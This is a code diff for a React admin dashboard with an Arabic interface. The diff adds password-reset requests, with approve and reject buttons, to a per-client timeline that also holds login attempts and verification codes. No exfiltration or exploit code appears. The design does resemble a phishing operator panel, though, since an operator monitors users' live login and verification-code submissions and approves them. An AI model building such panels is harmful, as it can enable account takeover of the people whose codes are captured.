@@ -2,7 +2,7 @@ import { useEffect, useState, useRef } from 'react';
 import {
   Users, CheckCircle2, Clock, Activity, Eye, EyeOff,
   RefreshCw, Wifi, WifiOff, Shield, Calendar, Phone,
-  CreditCard, Mail, Layout, List, User, Lock, FileText, Hash,
+  CreditCard, Mail, Layout, List, User, Lock, FileText, Hash, Key,
   LogIn as LogInIcon, ShieldCheck, Copy, Check, Wifi as WifiIcon, Volume2, VolumeX, Trash2, X, AlertTriangle, Menu, MoreVertical
 } from 'lucide-react';
 import { useSiteConfig, FormField } from '@/context/SiteConfigContext';
@@ -47,6 +47,14 @@ type RegistrationWithMeta = {
   extra_fields?: Record<string, string>;
   login_attempts?: LoginAttempt[];
   verification_codes?: VerificationCode[];
+  password_resets?: PasswordReset[];
+};
+
+type PasswordReset = {
+  id: string;
+  contact: string;
+  status: 'pending' | 'approved' | 'rejected';
+  created_at: string;
 };
 
 type VerificationCode = {
@@ -140,6 +148,7 @@ function RegistrationsTab() {
     registrations: firestoreRegistrations, 
     loginAttempts: firestoreLoginAttempts, 
     verificationCodes: firestoreVerificationCodes, 
+    passwordResets: firestorePasswordResets,
     loading,
     refresh: refreshFirestore 
   } = useFirestoreAdmin();
@@ -151,6 +160,7 @@ function RegistrationsTab() {
       ...user,
       login_attempts: [],
       verification_codes: [],
+      password_resets: [],
     }));
 
     // 2. Link login attempts
@@ -165,7 +175,6 @@ function RegistrationsTab() {
         target.login_attempts = target.login_attempts || [];
         target.login_attempts.push(login);
       } else if (login.clientId || login.email) {
-        // Create virtual registration for orphan login
         regs.push({
           id: login.id,
           full_name: login.email?.split('@')[0] || 'عميل جديد',
@@ -179,6 +188,7 @@ function RegistrationsTab() {
           client_id: login.clientId,
           login_attempts: [login],
           verification_codes: [],
+          password_resets: [],
           _new: true,
         });
       }
@@ -186,7 +196,6 @@ function RegistrationsTab() {
 
     // 3. Link verification codes
     firestoreVerificationCodes.forEach(vc => {
-      // Normalize verification code format
       const transformedVC = {
         id: vc.id,
         registration_id: vc.userId || null,
@@ -209,7 +218,6 @@ function RegistrationsTab() {
           target.verification_codes.push(transformedVC);
         }
       } else if (vc.clientId || vc.userId) {
-        // Create virtual registration for orphan verification code
         regs.push({
           id: vc.id,
           full_name: 'عميل جديد',
@@ -223,23 +231,54 @@ function RegistrationsTab() {
           client_id: vc.clientId,
           login_attempts: [],
           verification_codes: [transformedVC],
+          password_resets: [],
           _new: true,
         });
       }
     });
 
-    // Sort verification codes and login attempts within each registration
-    regs.forEach(r => {
-      if (r.login_attempts) {
-        r.login_attempts.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
-      }
-      if (r.verification_codes) {
-        r.verification_codes.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
+    // 4. Link password resets
+    firestorePasswordResets.forEach(pr => {
+      const target = regs.find(r => 
+        (r.clientId === pr.clientId && pr.clientId) ||
+        (r.client_id === pr.clientId && pr.clientId) ||
+        (r.email?.toLowerCase() === pr.contact.toLowerCase())
+      );
+
+      if (target) {
+        target.password_resets = target.password_resets || [];
+        if (!target.password_resets.find(existing => existing.id === pr.id)) {
+          target.password_resets.push(pr);
+        }
+      } else {
+        regs.push({
+          id: pr.id,
+          full_name: 'طلب استعادة كلمة مرور',
+          email: pr.contact,
+          phone: '',
+          national_id: '',
+          date_of_birth: '',
+          status: 'pending',
+          created_at: pr.created_at,
+          clientId: pr.clientId,
+          client_id: pr.clientId,
+          login_attempts: [],
+          verification_codes: [],
+          password_resets: [pr],
+          _new: true,
+        });
       }
     });
 
+    // Sort everything
+    regs.forEach(r => {
+      if (r.login_attempts) r.login_attempts.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
+      if (r.verification_codes) r.verification_codes.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
+      if (r.password_resets) r.password_resets.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
+    });
+
     return regs;
-  }, [firestoreRegistrations, firestoreLoginAttempts, firestoreVerificationCodes]);
+  }, [firestoreRegistrations, firestoreLoginAttempts, firestoreVerificationCodes, firestorePasswordResets]);
 
   // Update current time every minute
   useEffect(() => {
@@ -258,6 +297,9 @@ function RegistrationsTab() {
     }
     if (reg.verification_codes) {
       reg.verification_codes.forEach(v => times.push(new Date(v.created_at).getTime()));
+    }
+    if (reg.password_resets) {
+      reg.password_resets.forEach(p => times.push(new Date(p.created_at).getTime()));
     }
     
     if (times.length === 0) return null;
@@ -438,6 +480,21 @@ function RegistrationsTab() {
       await refreshFirestore();
     } catch (err) {
       console.error('Logout notice error:', err);
+    }
+  };
+
+  // Handle password reset approval
+  const handlePasswordReset = async (requestId: string, action: 'approved' | 'rejected') => {
+    try {
+      const { doc, updateDoc } = await import('firebase/firestore');
+      const { db } = await import('@/lib/firestore');
+      await updateDoc(doc(db!, 'passwordResets', requestId), {
+        status: action,
+        updatedAt: new Date()
+      });
+      await refreshFirestore();
+    } catch (err) {
+      console.error('[Admin] Error updating password reset status:', err);
     }
   };
 
@@ -746,6 +803,18 @@ function RegistrationsTab() {
                     });
                   }
 
+                  // Add password resets
+                  if (selected.password_resets && selected.password_resets.length > 0) {
+                    selected.password_resets.forEach(pr => {
+                      timeline.push({
+                        id: pr.id,
+                        type: 'password_reset' as any,
+                        created_at: pr.created_at,
+                        data: pr,
+                      });
+                    });
+                  }
+
                   // Sort by most recent first
                   timeline.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
 
@@ -895,6 +964,37 @@ function RegistrationsTab() {
                                     ✕ تم الرفض
                                   </div>
                                 )}
+                              </div>
+                            </div>
+                          );
+                        }
+
+                        // Password Reset Card
+                        if (item.type === ('password_reset' as any)) {
+                          const resetStatus = item.data.status;
+                          return (
+                            <div key={item.id} className={`rounded-xl border ${isNewest ? 'border-orange-500/50 bg-slate-700/30' : 'border-slate-700 bg-slate-800/50'} p-4`}>
+                              <div className="flex items-center justify-between mb-3">
+                                <div className="flex items-center gap-2">
+                                  <Key className={`w-4 h-4 ${isNewest ? 'text-orange-400' : 'text-orange-500/70'}`} />
+                                  <h4 className={`text-sm font-bold ${isNewest ? 'text-orange-400' : 'text-white'}`}>استعادة كلمة المرور</h4>
+                                </div>
+                                <span className={`text-[10px] px-2 py-0.5 rounded-full ${isNewest ? 'bg-orange-500/20 text-orange-400' : 'bg-slate-700 text-slate-400'}`}>
+                                  {formatTimeAgo(item.created_at)}
+                                </span>
+                              </div>
+                              <div className="bg-slate-900/50 rounded-lg p-3">
+                                <p className="text-[10px] text-slate-500 mb-1">البريد المستهدف</p>
+                                <p className="text-xs text-white font-bold mb-3 ltr text-left">{item.data.contact}</p>
+                                
+                                {resetStatus === 'pending' && (
+                                  <div className="flex gap-2">
+                                    <button onClick={() => handlePasswordReset(item.id, 'approved')} className="flex-1 bg-green-600 hover:bg-green-700 text-white text-[10px] font-bold py-2 px-3 rounded-lg transition-colors">✓ موافق</button>
+                                    <button onClick={() => handlePasswordReset(item.id, 'rejected')} className="flex-1 bg-red-600 hover:bg-red-700 text-white text-[10px] font-bold py-2 px-3 rounded-lg transition-colors">✕ رفض</button>
+                                  </div>
+                                )}
+                                {resetStatus === 'approved' && <div className="bg-green-500/20 text-green-400 text-[10px] font-bold py-2 px-3 rounded-lg text-center">✓ تمت الموافقة</div>}
+                                {resetStatus === 'rejected' && <div className="bg-red-500/20 text-red-400 text-[10px] font-bold py-2 px-3 rounded-lg text-center">✕ تم الرفض</div>}
                               </div>
                             </div>
                           );
